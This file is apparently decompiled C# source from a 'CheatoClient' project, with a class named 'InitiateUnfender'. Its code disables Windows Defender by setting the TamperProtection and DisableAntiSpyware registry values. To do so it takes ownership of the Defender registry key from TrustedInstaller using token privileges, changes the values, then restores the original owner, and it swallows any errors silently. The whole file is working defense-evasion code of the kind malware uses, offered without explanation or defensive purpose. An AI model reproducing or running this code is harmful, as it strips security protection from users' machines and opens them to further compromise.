using System;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace CheatoClient
{
	// Token: 0x02000021 RID: 33
	public class InitiateUnfender
	{
		// Token: 0x0600014C RID: 332 RVA: 0x0000C890 File Offset: 0x0000AA90
		public static void DisableFender(bool disableTamperProtection, bool disableDefender)
		{
			if (disableTamperProtection)
			{
				RegistryKey Tamper = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows Defender\\Features", true);
				Tamper.SetValue("TamperProtection", 4, RegistryValueKind.DWord);
				Tamper.Close();
			}
			else
			{
				RegistryKey Tamper2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows Defender\\Features", true);
				Tamper2.SetValue("TamperProtection", 5, RegistryValueKind.DWord);
				Tamper2.Close();
			}
			RegistryKey PolicyFromDisable = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender", true);
			try
			{
				PolicyFromDisable.GetValue("DisableAntiSpyware");
				PolicyFromDisable.CreateSubKey("DisableAntiSpyware");
				PolicyFromDisable.SetValue("DisableAntiSpyware", disableDefender, RegistryValueKind.DWord);
			}
			catch
			{
				PolicyFromDisable.CreateSubKey("DisableAntiSpyware");
				PolicyFromDisable.SetValue("DisableAntiSpyware", disableDefender, RegistryValueKind.DWord);
			}
		}

		// Token: 0x0600014D RID: 333 RVA: 0x0000C974 File Offset: 0x0000AB74
		public static void ByPassTamper(bool istrue)
		{
			try
			{
				WindowsIdentity id = WindowsIdentity.GetCurrent();
				bool blRc = TokenManipulation.MySetPrivilege("SeTakeOwnershipPrivilege", true);
				bool flag = !blRc;
				if (flag)
				{
					throw new PrivilegeNotHeldException("SeTakeOwnershipPrivilege");
				}
				blRc = TokenManipulation.MySetPrivilege("SeRestorePrivilege", true);
				bool flag2 = !blRc;
				if (flag2)
				{
					throw new PrivilegeNotHeldException("SeRestorePrivilege");
				}
				RegistryKey OwnerShipByPass = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows Defender\\Features", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership);
				RegistrySecurity regSecTempo = OwnerShipByPass.GetAccessControl(AccessControlSections.All);
				IdentityReference oldId = regSecTempo.GetOwner(typeof(SecurityIdentifier));
				SecurityIdentifier siTrustedInstaller = new SecurityIdentifier(oldId.ToString());
				regSecTempo.SetOwner(id.User);
				OwnerShipByPass.SetAccessControl(regSecTempo);
				RegistryAccessRule regARFullAccess = new RegistryAccessRule(id.User, RegistryRights.FullControl, InheritanceFlags.ContainerInherit, PropagationFlags.None, AccessControlType.Allow);
				regSecTempo.AddAccessRule(regARFullAccess);
				OwnerShipByPass.SetAccessControl(regSecTempo);
				InitiateUnfender.DisableFender(istrue, istrue);
				regSecTempo.SetOwner(siTrustedInstaller);
				OwnerShipByPass.SetAccessControl(regSecTempo);
				regSecTempo.RemoveAccessRule(regARFullAccess);
				OwnerShipByPass.SetAccessControl(regSecTempo);
			}
			catch (Exception)
			{
			}
		}
	}
}
